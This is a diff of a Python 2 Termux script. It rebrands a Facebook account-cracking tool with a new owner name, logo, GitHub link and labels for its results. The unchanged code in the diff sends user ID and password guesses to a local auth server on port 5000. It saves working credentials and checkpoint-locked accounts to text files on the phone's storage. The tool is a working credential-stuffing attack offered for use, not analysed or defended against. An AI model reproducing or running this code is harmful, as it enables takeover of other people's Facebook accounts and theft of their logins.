@@ -17,7 +17,7 @@ from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 os.system('termux-setup-storage')
 os.system("git pull")
-if not os.path.isfile('/data/data/com.termux/files/home/sani/...../public/index.js'):
+if not os.path.isfile('/data/data/com.termux/files/home/aamir-javed/...../public/index.js'):
     os.system('cd ..... && npm install')
     os.system("fuser -k 5000/tcp &")
     os.system("#")
@@ -43,17 +43,16 @@ header = {
 os.system('git pull')
 os.system('clear')
 logo = """
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
-\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
-\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
+\033[1;97m  ___  \033[1;91m  ___  \033[1;96m___  ______________ 
+\033[1;97m / _ \ \033[1;91m / _ \ \033[1;96m|  \/  |_   _| ___ \
+\033[1;97m/ /_\ \\033[1;91m/ /_\ \\033[1;96m| .  . | | | | |_/ /
+\033[1;97m|  _  |\033[1;91m|  _  |\033[1;96m| |\/| | | | |    / 
+\033[1;97m| | | |\033[1;91m| | | |\033[1;96m| |  | |_| |_| |\ \ 
+\033[1;97m\_| |_/\033[1;91m\_| |_/\033[1;96m\_|  |_/\___/\_| \_| \033[1;90mKING
 \033[1;94m══════════════════════════════════════════════
-\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
-\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
-\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
+\033[1;90m➣ OWNER  : \033[1;97mAAMIR JAVED
+\033[1;90m➣ Fb-Team: \033[1;97mHUNTSMAN KINGS OF FACEBOOK
+\033[1;90m➣ Github : \033[1;97mhttps://github.com/huntsman-team
 \033[1;94m══════════════════════════════════════════════ """
 
 
@@ -67,7 +66,7 @@ def log_menu():
 	print '[!] Token Not Found'
 	os.system('rm -rf login.txt')
 	time.sleep(1)
-	os.system('python2 jam.py')
+	os.system('python2 aamir.py')
 
 
 
@@ -279,13 +278,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass1
+                print '\033[1;92m[HUNTSMAN-Ok]➤➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass1
+                print '\033[1;95m[AAMIR-KING-Cp]➤ ' + uid + ' | ' + pass1
                 cp = open('/sdcard/ids/jam_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -295,13 +294,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;92m[HUNTSMAN-Ok]➤➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;95m[AAMIR-KING-Cp]➤ ' + uid + ' | ' + pass2
                     cp = open('/sdcard/ids/jam_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -459,13 +458,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass1
+                print '\033[1;92m[HUNTSMAN-Ok]➤➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass1
+                print '\033[1;95m[AAMIR-KING-Cp]➤ ' + uid + ' | ' + pass1
                 cp = open('/sdcard/ids/jam_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -474,13 +473,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;92m[HUNTSMAN-Ok]➤➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;95m[AAMIR-KING-Cp]➤ ' + uid + ' | ' + pass2
                     cp = open('/sdcard/ids/jam_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
